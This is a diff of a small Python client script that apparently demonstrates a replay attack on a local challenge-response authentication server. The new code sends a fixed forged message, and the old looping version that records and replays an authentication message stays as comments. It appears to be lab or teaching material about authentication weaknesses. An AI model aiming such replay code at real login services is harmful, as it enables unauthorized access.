@@ -4,35 +4,54 @@ import time
 HOST = "127.0.0.1"
 PORT = 65432
 
-saved_message = None
+# reuse old message intentionally
+payload = "1|fakehmac"
 
-while True:
-
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
     client.connect((HOST, PORT))
+    client.recv(1024)
+    client.send(payload.encode())
 
-    challenge = client.recv(1024).decode()
-    challenge = int(challenge)
+    print(client.recv(1024).decode())
+    time.sleep(3)
 
-    print("\nAttacker received challenge:", challenge)
 
-    if saved_message is None:
 
-        print("Recording first valid authentication...")
+# import socket
+# import time
 
-        counter = 1
-        fake_response = "replay_attack"
+# HOST = "127.0.0.1"
+# PORT = 65432
 
-        saved_message = f"{counter},{fake_response}"
+# saved_message = None
 
-        client.send(saved_message.encode())
+# while True:
 
-    else:
+#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     client.connect((HOST, PORT))
 
-        print("Replaying old authentication message!")
+#     challenge = client.recv(1024).decode()
+#     challenge = int(challenge)
 
-        client.send(saved_message.encode())
+#     print("\nAttacker received challenge:", challenge)
 
-    client.close()
+#     if saved_message is None:
 
-    time.sleep(5)
+#         print("Recording first valid authentication...")
+
+#         counter = 1
+#         fake_response = "replay_attack"
+
+#         saved_message = f"{counter},{fake_response}"
+
+#         client.send(saved_message.encode())
+
+#     else:
+
+#         print("Replaying old authentication message!")
+
+#         client.send(saved_message.encode())
+
+#     client.close()
+
+#     time.sleep(5)
